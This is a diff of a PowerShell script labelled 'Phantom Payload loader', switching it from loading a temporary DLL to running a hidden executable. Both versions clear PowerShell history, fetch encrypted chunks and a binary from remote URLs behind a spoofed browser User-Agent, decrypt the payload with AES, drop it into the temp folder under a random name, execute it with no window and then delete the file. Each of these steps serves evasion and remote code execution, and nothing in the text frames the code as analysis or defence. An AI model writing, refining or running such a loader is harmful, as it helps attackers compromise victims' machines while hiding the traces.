@@ -1,4 +1,4 @@
-#  <~ Phantom Payload loader (variant A â€” temp DLL ~5s lifetime). ~>
+#  <~ Phantom Payload loader (A2 â€” stdin-piped exe). ~>
 $ErrorActionPreference = 'SilentlyContinue'
 
 # -- 1. Clear PSReadLine history --
@@ -45,7 +45,7 @@ function HexBytes([string]$h) {
     return ,$r
 }
 
-# -- 5. Fetch chunks + reassemble --
+# -- 5. Fetch chunks + mac + sl.exe --
 $wc = New-Object System.Net.WebClient
 $wc.Headers.Add('User-Agent','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')
 $envParts = @()
@@ -67,7 +67,7 @@ foreach ($p in $envParts) {
 $macB64 = $wc.DownloadString($MacUrl)
 $macRef = [Convert]::FromBase64String($macB64.Trim())
 $slB64  = $wc.DownloadString($SlUrl)
-$slDll  = [Convert]::FromBase64String($slB64.Trim())
+$slExe  = [Convert]::FromBase64String($slB64.Trim())
 $wc.Dispose()
 
 # -- 6. Split envelope --
@@ -88,7 +88,7 @@ else {
     for ($i = 0; $i -lt $macCur.Length; $i++) { $xor = $xor -bor ($macCur[$i] -bxor $macRef[$i]) }
     if ($xor -ne 0) { $ok = $false }
 }
-if (-not $ok) { return }
+if (-not $ok) { Write-Host 'hmac fail'; return }
 
 # -- 8. AES-256-CBC decrypt --
 $aes = [System.Security.Cryptography.Aes]::Create()
@@ -104,56 +104,37 @@ $cs.Write($ct, 0, $ct.Length)
 $cs.FlushFinalBlock()
 $fivem = $ms.ToArray()
 $cs.Dispose(); $ms.Dispose(); $dec.Dispose(); $aes.Dispose()
-
 [Array]::Clear($key, 0, $key.Length)
 [Array]::Clear($ct,  0, $ct.Length)
 [Array]::Clear($iv,  0, $iv.Length)
 $envelope = $null; $envParts = $null
 
-# -- 9. Write sl.dll to temp with random name --
-$ext  = [IO.Path]::GetRandomFileName() -replace '\..*$',''
-$dllPath = [IO.Path]::Combine([IO.Path]::GetTempPath(), "ms$ext.dll")
-[IO.File]::WriteAllBytes($dllPath, $slDll)
-[Array]::Clear($slDll, 0, $slDll.Length)
+# -- 9. Write sl.exe to temp with random name --
+$ext  = ([IO.Path]::GetRandomFileName()) -replace '\..*$',''
+$exePath = [IO.Path]::Combine([IO.Path]::GetTempPath(), "ms$ext.exe")
+[IO.File]::WriteAllBytes($exePath, $slExe)
+[Array]::Clear($slExe, 0, $slExe.Length)
 
-# -- 10. P/Invoke bootstrap (minimal â€” just LoadLibrary + GetProcAddress + FreeLibrary) --
-Add-Type -Name PL -Namespace Ph -MemberDefinition @"
-    [System.Runtime.InteropServices.DllImport("kernel32", CharSet=System.Runtime.InteropServices.CharSet.Unicode)]
-    public static extern System.IntPtr LoadLibraryW(string lpFileName);
-    [System.Runtime.InteropServices.DllImport("kernel32", CharSet=System.Runtime.InteropServices.CharSet.Ansi)]
-    public static extern System.IntPtr GetProcAddress(System.IntPtr hModule, string lpProcName);
-    [System.Runtime.InteropServices.DllImport("kernel32")]
-    public static extern bool FreeLibrary(System.IntPtr hModule);
-"@
+# -- 10. Spawn exe with Fivem bytes piped to stdin, hidden, no window --
+$psi = New-Object System.Diagnostics.ProcessStartInfo
+$psi.FileName               = $exePath
+$psi.UseShellExecute        = $false
+$psi.RedirectStandardInput  = $true
+$psi.RedirectStandardOutput = $true
+$psi.RedirectStandardError  = $true
+$psi.CreateNoWindow         = $true
+$psi.WindowStyle            = [System.Diagnostics.ProcessWindowStyle]::Hidden
 
-# -- 11. Delegate type for RunLaunchFromMemory(IntPtr bytes, int len) â†’ int --
-Add-Type -TypeDefinition @"
-using System;
-using System.Runtime.InteropServices;
-[UnmanagedFunctionPointer(CallingConvention.Winapi)]
-public delegate int RunLaunchDelegate(IntPtr bytes, int len);
-"@
-
-$h = [Ph.PL]::LoadLibraryW($dllPath)
-if ($h -eq [IntPtr]::Zero) {
-    Remove-Item $dllPath -Force -EA Ignore
-    return
-}
-$fn = [Ph.PL]::GetProcAddress($h, 'RunLaunchFromMemory')
-if ($fn -eq [IntPtr]::Zero) {
-    [void][Ph.PL]::FreeLibrary($h)
-    Remove-Item $dllPath -Force -EA Ignore
-    return
-}
-
-$del = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($fn, [RunLaunchDelegate])
-
-$pin = [System.Runtime.InteropServices.GCHandle]::Alloc($fivem, [System.Runtime.InteropServices.GCHandleType]::Pinned)
 try {
-    [void]$del.Invoke($pin.AddrOfPinnedObject(), $fivem.Length)
-} finally {
-    $pin.Free()
-    [Array]::Clear($fivem, 0, $fivem.Length)
-    [void][Ph.PL]::FreeLibrary($h)
-    Remove-Item $dllPath -Force -EA Ignore
-}
+    $p = [System.Diagnostics.Process]::Start($psi)
+    $p.StandardInput.BaseStream.Write($fivem, 0, $fivem.Length)
+    $p.StandardInput.BaseStream.Flush()
+    $p.StandardInput.Close()
+    [void]$p.WaitForExit(15000)
+} catch {}
+
+[Array]::Clear($fivem, 0, $fivem.Length)
+
+# -- 11. Delete temp exe (sl.exe also attempts self-delete) --
+Start-Sleep -Milliseconds 500
+Remove-Item $exePath -Force -EA Ignore
